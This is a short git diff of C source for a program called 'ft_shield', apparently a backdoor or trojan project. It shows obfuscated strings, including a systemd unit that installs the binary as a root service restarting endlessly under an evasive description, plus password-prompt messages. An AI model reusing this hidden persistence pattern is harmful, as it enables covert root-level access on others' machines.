@@ -16,6 +16,7 @@ typedef enum ObfuscatedStringTableIndex {
     LOGIN_SUCCESSFUL,
 } ObfuscatedStringTableIndex;
 
+// Will be preprocessed for codegen by scripts/encode.py
 #define OBFUSCATE(x) x
 
 static uint8_t proc_self_exe[] = OBFUSCATE("/proc/self/exe");
@@ -25,8 +26,9 @@ static uint8_t systemctl_start_ft_shield[] = OBFUSCATE("systemctl start ft_shiel
 static uint8_t systemctl_stop_ft_shield[] = OBFUSCATE("systemctl stop ft_shield");
 static uint8_t systemd_config[] = OBFUSCATE("[Unit]\nDescription=None of your business G\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/bin/ft_shield %s\n\n[Install]\nWantedBy=multi-user.target\n");
 static uint8_t systemd_config_path[] = OBFUSCATE("/etc/systemd/system/ft_shield.service");
-static uint8_t invalid_password_try_again[] = OBFUSCATE("Invalid password, try again");
-static uint8_t login_successful[] = OBFUSCATE("Login successful");
+static uint8_t invalid_password_try_again[] = OBFUSCATE("Invalid password, try again\n");
+static uint8_t login_successful[] = OBFUSCATE("Login successful\n");
+
 
 static ObfuscatedStringTableEntry strings[] = {
     {.data = (uint8_t *)proc_self_exe,              .len = sizeof(proc_self_exe),              .decoded = false},
